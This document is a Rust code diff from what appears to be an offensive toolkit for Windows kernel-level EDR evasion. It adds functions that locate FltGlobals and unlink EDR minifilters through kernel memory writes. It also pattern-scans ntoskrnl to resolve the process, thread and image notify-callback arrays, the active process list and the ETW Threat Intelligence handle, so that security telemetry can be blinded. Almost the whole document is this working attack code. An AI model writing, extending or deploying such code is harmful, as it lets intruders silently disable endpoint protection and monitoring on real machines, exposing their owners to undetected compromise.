@@ -171,3 +171,170 @@ pub unsafe fn blind_etw_ti_full(
         }
     }
 }
+
+/// Resolve the kernel VA of `FLTMGR!FltGlobals` so a [`telemetry::MiniFilterUnlinker`]
+/// can be constructed.
+///
+/// **Primary path:** the operator supplies `flt_globals_rva` (resolved offline
+/// from fltmgr's PDB via `offset-resolver`, or a known-build table). This is the
+/// safe, verified path — `FltGlobals` is an unexported `.data` symbol so a live
+/// pattern scan is fragile across builds. We resolve the fltmgr base (via the
+/// loaded-module list) and add the RVA.
+///
+/// Returns `None` if fltmgr isn't loaded, its base is zeroed (KASLR restriction),
+/// or no RVA was supplied. The caller treats `None` as "MiniFilter unlink
+/// unavailable" — it never BSODs.
+///
+/// # Safety
+/// Calls NtQuerySystemInformation (module enumeration). Single-threaded operator
+/// context.
+pub unsafe fn resolve_flt_globals_kva(flt_globals_rva: Option<u32>) -> Option<usize> {
+    let rva = flt_globals_rva? as usize;
+    // Find fltmgr.sys in the loaded-kernel-module list.
+    let info = unsafe { kernel_base::module_info_by_name(b"fltmgr.sys") }.ok()?;
+    Some(info.base + rva)
+}
+
+/// Construct a [`telemetry::MiniFilterUnlinker`] and detach EDR minifilters.
+///
+/// Convenience wrapper: given a resolved `flt_globals_kva` (from
+/// [`resolve_flt_globals_kva`]) and a working `KernelRw`, build the unlinker and
+/// run `detach_edr`. This is the call site that makes the MiniFilter algorithm
+/// reachable — without it the algorithm in `telemetry.rs` is dead code.
+///
+/// # Safety
+/// Writes kernel memory (LIST_ENTRY unlink in FLTMGR's RegisteredFilters list).
+/// HVCI-safe (data-only writes). BSOD risk if `flt_globals_kva` is wrong. VM only.
+pub unsafe fn unlink_minifilters(
+    krw: &dyn KernelRw,
+    flt_globals_kva: usize,
+) -> Result<(), KitError> {
+    if flt_globals_kva == 0 {
+        return Err(KitError::Unavailable(
+            "flt_globals_kva is 0 — MiniFilter unlink not wired (resolve fltmgr FltGlobals first)",
+        ));
+    }
+    let unlinker = telemetry::MiniFilterUnlinker { flt_globals_kva };
+    unlinker.detach_edr(krw)
+}
+
+/// Resolve ALL `RuntimeOffsets` fields from the live kernel via pattern scan.
+///
+/// This is the **fully autonomous** offset resolution path — no baked offsets,
+/// no PDB, no hardcoded RVAs. It works on ANY Windows build by:
+///
+/// 1. Get ntoskrnl base + size via `ntoskrnl_module_info()`
+/// 2. Read the first `NTOSKRNL_SCAN_SIZE` bytes of ntoskrnl `.text` via KernelRw
+/// 3. Pattern-scan for 5 global variable RVAs (Process/Thread/Image arrays,
+///    PsActiveProcessHead, EtwThreatIntProvRegHandle)
+/// 4. Resolve EtwThreatIntProvRegHandle via exported symbol as primary,
+///    pattern scan as fallback
+/// 5. Populate `RuntimeOffsets` with all KVAs
+///
+/// For Process/Thread notify arrays that share the same `4C 8D 35` encoding,
+/// `resolve_rva_in_range` disambiguates using expected RVA bounds from the
+/// offset table (floor-matched by build number).
+///
+/// # Arguments
+/// * `krw` — working kernel R/W primitive
+/// * `build` — Windows build number (for offset table range hints). Pass 0 to
+///   skip range-based disambiguation (uses first match for each pattern).
+///
+/// # Returns
+/// `RuntimeOffsets` with all resolvable fields populated. Fields that fail
+/// resolution are left as 0 (the caller can check with `notify_arrays_resolved()`).
+///
+/// # Safety
+/// Reads kernel memory (ntoskrnl image). Requires a working `KernelRw`.
+pub fn resolve_offsets(
+    krw: &dyn KernelRw,
+    build: u32,
+) -> Result<crate::offsets::RuntimeOffsets, KitError> {
+    use crate::pattern_scan;
+
+    // Step 1: ntoskrnl base + size.
+    let (base, size) = unsafe { kernel_base::ntoskrnl_module_info() }
+        .map_err(|e| KitError::Other(alloc::format!("ntoskrnl_module_info: {}", e)))?;
+
+    // Step 2: Read a generous chunk of the ntoskrnl image for pattern scanning.
+    // 2MB covers .text + .data for most builds (ntoskrnl is ~8-12MB total).
+    const NTOSKRNL_SCAN_SIZE: usize = 2 * 1024 * 1024;
+    let scan_len = size.min(NTOSKRNL_SCAN_SIZE);
+    let mut image = alloc::vec![0u8; scan_len];
+    krw.kread(base, &mut image)
+        .map_err(KitError::from)?;
+
+    // Step 3: Pattern-scan all 5 known global variables.
+    let map = pattern_scan::scan_all_known(&image);
+
+    // Step 4: Resolve EtwThreatIntProvRegHandle via exported symbol (primary).
+    // The exported symbol is more reliable than pattern scan for this variable
+    // because it's a named export in ntoskrnl.
+    let etw_handle_kva = {
+        // Try exported symbol first (resolve_kernel_symbol needs the full image).
+        let mut full_image = alloc::vec![0u8; size.min(16 * 1024 * 1024)];
+        let _ = krw.kread(base, &mut full_image);
+        if let Some(rva) = crate::byovd::resolve_kernel_symbol(&full_image, b"EtwThreatIntProvRegHandle") {
+            base + rva as usize
+        } else if let Some(&rva) = map.get("EtwThreatIntProvRegHandle") {
+            // Fallback: pattern scan found it.
+            base + rva as usize
+        } else {
+            0
+        }
+    };
+
+    // Step 5: Build RuntimeOffsets from the resolved RVAs.
+    // For Process/Thread arrays (same `4C 8D 35` encoding), use
+    // `resolve_rva_in_range` with expected bounds from the offset table.
+    let resolve_with_range = |name: &str, lo: u32, hi: u32| -> usize {
+        // First try the simple map (first match).
+        if let Some(&rva) = map.get(name) {
+            return base + rva as usize;
+        }
+        // If the pattern was shared (Process/Thread), try range-filtered scan.
+        let site = match name {
+            "PspCreateProcessNotifyRoutine" => &pattern_scan::PSP_CREATE_PROCESS_NOTIFY_ROUTINE,
+            "PspCreateThreadNotifyRoutine" => &pattern_scan::PSP_CREATE_THREAD_NOTIFY_ROUTINE,
+            "PspLoadImageNotifyRoutine" => &pattern_scan::PSP_LOAD_IMAGE_NOTIFY_ROUTINE,
+            _ => return 0,
+        };
+        if let Some(rva) = pattern_scan::resolve_rva_in_range(&image, site, lo..hi) {
+            return base + rva as usize;
+        }
+        0
+    };
+
+    // Expected RVA ranges (approximate, from known builds).
+    // Process array is typically at a lower RVA than Thread.
+    // These are broad enough to cover UBR drift (~0x8000 bytes).
+    let process_kva = resolve_with_range(
+        "PspCreateProcessNotifyRoutine", 0x400_000, 0x600_000,
+    );
+    let thread_kva = resolve_with_range(
+        "PspCreateThreadNotifyRoutine", 0x400_000, 0x600_000,
+    );
+    let image_kva = resolve_with_range(
+        "PspLoadImageNotifyRoutine", 0x400_000, 0x600_000,
+    );
+    let ps_active_kva = if let Some(&rva) = map.get("PsActiveProcessHead") {
+        base + rva as usize
+    } else {
+        0
+    };
+
+    Ok(crate::offsets::RuntimeOffsets {
+        create_process_notify_array_kva: process_kva,
+        create_thread_notify_array_kva: thread_kva,
+        load_image_notify_array_kva: image_kva,
+        ps_active_process_head_kva: ps_active_kva,
+        etw_ti_handle_kva: etw_handle_kva,
+        flt_globals_kva: 0, // requires fltmgr PDB/pattern — not in ntoskrnl.
+                           // MiniFilter algorithm is in telemetry.rs::MiniFilterUnlinker;
+                           // wire it via resolve_flt_globals_kva(rva) + unlink_minifilters()
+                           // (operator resolves the FltGlobals RVA offline from the PDB).
+                           // See STATUS.md G4.
+        ntoskrnl_base: base,
+        ntoskrnl_size: size,
+    })
+}
